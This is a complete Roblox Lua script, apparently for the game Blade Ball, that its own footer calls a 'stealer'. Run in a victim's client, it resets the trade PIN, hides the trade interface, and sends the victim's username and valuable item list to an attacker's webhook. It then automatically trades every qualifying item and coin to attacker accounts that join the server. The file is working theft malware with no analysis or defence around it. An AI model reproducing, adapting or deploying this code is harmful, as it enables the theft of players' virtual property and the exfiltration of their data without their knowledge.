-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local auth_token = "EBK-SS-A" 
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- // VERIFICATIONS INITIALES (DU SCRIPT ORIGINAL)
if next(users) == nil or webhook == "" then return end
if game.PlaceId ~= 13772394625 then return end

-- Bypass PIN Code
pcall(function()
    netModule:WaitForChild("RF/ResetPINCode"):InvokeServer({["option"] = "PIN", ["value"] = "9079"})
end)

-- Gestion UI (On cache le trade pour la victime comme l'original)
local tradeGui = plr.PlayerGui.Trade
tradeGui.Black.Visible = false
tradeGui.Main.Visible = false
tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.Main.Visible = false end)

-- // FONCTION D'ENVOI WORKER
local function sendToWorker(payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- // FORMATAGE RAP
local function formatNumber(number)
    if not number then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- // SCAN INVENTAIRE (LOGIQUE ORIGINALE)
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local rap = 0
                -- Recherche du RAP dans les données complexes de BB
                if rapData[cat] then
                    for key, val in pairs(rapData[cat]) do
                        if string.find(key, info.Name) then rap = val break end
                    end
                end
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

-- // FONCTION EMBED
local function sendEmbed(title, color, isJoin)
    local total = 0
    local grouped = {}
    for _, item in ipairs(itemsToSend) do
        total = total + item.RAP
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end
    
    local itemText = ""
    for name, count in pairs(grouped) do
        itemText = itemText .. string.format("%s (x%d)\n", name, count)
    end

    local payload = {
        ["auth_token"] = auth_token,
        ["username"] = total >= 500 and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT",
        ["content"] = isJoin and ((ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')") or "Victim joined! Starting trade...",
        ["embeds"] = {{
            ["title"] = isJoin and (total >= 500 and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯") or "⚪ Server Hit 🎉",
            ["color"] = isJoin and (total >= 500 and 65280 or 8323327) or 16777215,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = plr.Name, inline = true},
                {name = "Summary 💰:", value = "Total RAP: **" .. formatNumber(total) .. "**", inline = true},
                {name = "Item list 📝:", value = itemText ~= "" and itemText or "None", inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    sendToWorker(payload)
end

-- // GESTION DU TRADE (LOGIQUE DU SCRIPT ORIGINAL)
local inTrade = false
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = tradeGui.Enabled end)

local function doTrade(targetName)
    local target = Players:WaitForChild(targetName)
    while #itemsToSend > 0 do
        -- Request
        repeat 
            wait(0.2)
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
        until inTrade
        
        -- Add Items
        local batch = {}
        for i = 1, math.min(100, #itemsToSend) do table.insert(batch, table.remove(itemsToSend, 1)) end
        for _, item in ipairs(batch) do
            netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
        end

        -- Add Coins
        pcall(function()
            local raw = plr.PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")
            local coins = tonumber(raw) or 0
            if coins > 0 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(coins) end
        end)

        -- Ready & Confirm
        repeat wait(0.1); netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true) until true
        task.wait(0.2)
        repeat wait(0.1); netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() until not inTrade
    end
end

-- // START
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    
    -- 1. On prévient qu'il a exécuté (Join Message)
    sendEmbed(nil, nil, true)

    -- 2. On attend que TU rejoignes (G User)
    local function check(p)
        if table.find(users, p.Name) then
            sendEmbed("⚪ Server Hit 🎉", 16777215, false) -- On envoie le "Server Hit"
            doTrade(p.Name)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do check(p) end
    Players.PlayerAdded:Connect(check)
end
